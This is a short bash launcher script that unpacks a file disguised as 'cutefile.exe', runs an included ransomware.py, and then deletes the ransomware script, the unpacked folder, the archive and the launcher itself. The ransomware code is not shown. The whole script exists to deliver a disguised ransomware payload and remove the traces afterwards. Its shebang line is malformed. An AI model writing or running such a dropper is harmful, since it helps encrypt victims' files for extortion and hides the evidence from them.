#! usr/bin/bash
filename="cutefile.exe"
rename="cutefile.zip"

if [ -f $filename ]; then
	$(mv -i $filename $rename)
fi

unzip $rename

cd cutefile
cp ./ransomware.py ../ransomware.py
cp ./decrypt.py ../decrypt.py

cd ..
python ransomware.py

rm ransomware.py
rm -rf cutefile
rm cutefile.zip
rm run.sh
		
